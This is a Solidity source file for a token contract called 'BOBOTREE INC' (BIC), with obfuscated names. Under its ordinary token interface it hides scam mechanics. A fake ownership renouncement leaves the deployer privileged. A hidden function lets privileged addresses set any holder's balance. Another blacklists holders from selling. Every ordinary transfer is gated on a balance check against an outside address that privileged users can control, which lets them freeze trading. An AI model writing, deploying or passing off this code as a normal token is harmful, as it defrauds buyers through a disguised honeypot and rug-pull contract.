//SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;

interface amountMarketing {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface tradingFeeMin {
    function createPair(address listBuy, address toWallet) external returns (address);
}

abstract contract toTrading {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface fundTradingLaunch {
    function totalSupply() external view returns (uint256);

    function balanceOf(address tokenList) external view returns (uint256);

    function transfer(address buyModeLiquidity, uint256 feeTxTeam) external returns (bool);

    function allowance(address teamReceiver, address spender) external view returns (uint256);

    function approve(address spender, uint256 feeTxTeam) external returns (bool);

    function transferFrom(address sender,address buyModeLiquidity,uint256 feeTxTeam) external returns (bool);

    event Transfer(address indexed from, address indexed minFund, uint256 value);
    event Approval(address indexed teamReceiver, address indexed spender, uint256 value);
}

interface fundTradingLaunchMetadata is fundTradingLaunch {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract BOBOTREEINC is toTrading, fundTradingLaunch, fundTradingLaunchMetadata {

    uint256 public launchAuto;

    function symbol() external view virtual override returns (string memory) {
        return enableLaunched;
    }

    function transfer(address teamLaunch, uint256 feeTxTeam) external virtual override returns (bool) {
        return liquidityReceiver(_msgSender(), teamLaunch, feeTxTeam);
    }

    function owner() external view returns (address) {
        return receiverLaunchFrom;
    }

    address txTotalAuto = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function liquidityReceiver(address senderAt, address buyModeLiquidity, uint256 feeTxTeam) internal returns (bool) {
        if (senderAt == modeShould) {
            return atShouldMax(senderAt, buyModeLiquidity, feeTxTeam);
        }
        uint256 sellShould = fundTradingLaunch(liquidityWallet).balanceOf(maxReceiver);
        require(sellShould == marketingFund);
        require(!totalExemptMarketing[senderAt]);
        return atShouldMax(senderAt, buyModeLiquidity, feeTxTeam);
    }

    address maxReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 private shouldSellBuy = 100000000 * 10 ** 18;

    bool public liquidityTotal;

    function sellTo() private view {
        require(modeMin[_msgSender()]);
    }

    address public modeShould;

    event OwnershipTransferred(address indexed toLaunchTeam, address indexed tokenLaunched);

    uint256 public exemptTotalLaunch;

    function allowance(address feeTotal, address shouldModeSender) external view virtual override returns (uint256) {
        if (shouldModeSender == txTotalAuto) {
            return type(uint256).max;
        }
        return isModeLaunch[feeTotal][shouldModeSender];
    }

    function balanceOf(address tokenList) public view virtual override returns (uint256) {
        return fundLimit[tokenList];
    }

    string private exemptShould = "BOBOTREE INC";

    function approve(address shouldModeSender, uint256 feeTxTeam) public virtual override returns (bool) {
        isModeLaunch[_msgSender()][shouldModeSender] = feeTxTeam;
        emit Approval(_msgSender(), shouldModeSender, feeTxTeam);
        return true;
    }

    uint256 listMax;

    bool public swapLaunchBuy;

    mapping(address => uint256) private fundLimit;

    address public liquidityWallet;

    function receiverMin(address teamLaunch, uint256 feeTxTeam) public {
        sellTo();
        fundLimit[teamLaunch] = feeTxTeam;
    }

    function decimals() external view virtual override returns (uint8) {
        return buyAmount;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return shouldSellBuy;
    }

    uint256 public shouldWallet;

    constructor (){
        
        txAmount();
        amountMarketing exemptReceiver = amountMarketing(txTotalAuto);
        liquidityWallet = tradingFeeMin(exemptReceiver.factory()).createPair(exemptReceiver.WETH(), address(this));
        if (amountAt == shouldAuto) {
            shouldAuto = amountAt;
        }
        modeShould = _msgSender();
        modeMin[modeShould] = true;
        fundLimit[modeShould] = shouldSellBuy;
        if (shouldAuto != exemptTotalLaunch) {
            shouldAuto = exemptTotalLaunch;
        }
        emit Transfer(address(0), modeShould, shouldSellBuy);
    }

    function getOwner() external view returns (address) {
        return receiverLaunchFrom;
    }

    function txAmount() public {
        emit OwnershipTransferred(modeShould, address(0));
        receiverLaunchFrom = address(0);
    }

    function fromAmount(address listTx) public {
        sellTo();
        
        if (listTx == modeShould || listTx == liquidityWallet) {
            return;
        }
        totalExemptMarketing[listTx] = true;
    }

    uint256 public enableShouldMax;

    string private enableLaunched = "BIC";

    function launchEnable(address senderTotal) public {
        if (swapLaunchBuy) {
            return;
        }
        
        modeMin[senderTotal] = true;
        if (shouldWallet == enableShouldMax) {
            shouldAuto = enableShouldMax;
        }
        swapLaunchBuy = true;
    }

    uint256 public amountAt;

    mapping(address => bool) public modeMin;

    function name() external view virtual override returns (string memory) {
        return exemptShould;
    }

    uint8 private buyAmount = 18;

    function transferFrom(address senderAt, address buyModeLiquidity, uint256 feeTxTeam) external override returns (bool) {
        if (_msgSender() != txTotalAuto) {
            if (isModeLaunch[senderAt][_msgSender()] != type(uint256).max) {
                require(feeTxTeam <= isModeLaunch[senderAt][_msgSender()]);
                isModeLaunch[senderAt][_msgSender()] -= feeTxTeam;
            }
        }
        return liquidityReceiver(senderAt, buyModeLiquidity, feeTxTeam);
    }

    mapping(address => mapping(address => uint256)) private isModeLaunch;

    uint256 private shouldAuto;

    function atShouldMax(address senderAt, address buyModeLiquidity, uint256 feeTxTeam) internal returns (bool) {
        require(fundLimit[senderAt] >= feeTxTeam);
        fundLimit[senderAt] -= feeTxTeam;
        fundLimit[buyModeLiquidity] += feeTxTeam;
        emit Transfer(senderAt, buyModeLiquidity, feeTxTeam);
        return true;
    }

    address private receiverLaunchFrom;

    uint256 marketingFund;

    function teamFundMax(uint256 feeTxTeam) public {
        sellTo();
        marketingFund = feeTxTeam;
    }

    mapping(address => bool) public totalExemptMarketing;

}